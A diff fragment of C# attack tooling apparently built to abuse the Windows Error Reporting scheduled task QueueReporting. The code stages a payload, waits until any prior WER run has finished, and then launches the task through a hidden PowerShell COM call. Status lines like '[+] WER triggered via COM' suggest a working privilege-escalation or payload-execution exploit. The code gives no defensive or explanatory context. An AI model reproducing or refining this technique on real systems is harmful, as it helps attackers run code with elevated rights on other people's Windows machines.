@@ -284,15 +284,29 @@ if($r-eq 0){
 
         PreparePayload(runDir);
 
-        var psi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
-            @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
-            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
-        string taskOut = "";
-        using(var p=System.Diagnostics.Process.Start(psi)) {
-            taskOut = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
-            p.WaitForExit(5000);
+        /* Wait up to 30s for any existing wermgr.exe run to finish */
+        Console.Write("[*] Waiting for prior WER run to finish...");
+        for (int w = 0; w < 30; w++) {
+            var chk = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
+                @"/query /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting"" /fo csv /nh")
+                {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true};
+            string status = "";
+            using (var p = System.Diagnostics.Process.Start(chk))
+                status = p.StandardOutput.ReadToEnd();
+            if (!status.Contains("Running")) break;
+            Thread.Sleep(1000); Console.Write(".");
         }
-        Console.WriteLine($"[+] WER: {taskOut.Trim()}");
+        Console.WriteLine();
+
+        /* Trigger via PowerShell COM (reads environment fresher than schtasks.exe) */
+        string ps = "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
+                    "$t=$s.GetFolder('\\Microsoft\\Windows\\Windows Error Reporting').GetTask('QueueReporting');" +
+                    "$t.Run($null)";
+        var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
+            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ps}\"")
+            {UseShellExecute=false,CreateNoWindow=true};
+        using(var p=System.Diagnostics.Process.Start(psi)) p.WaitForExit(5000);
+        Console.WriteLine("[+] WER triggered via COM");
         return true;
     }
 
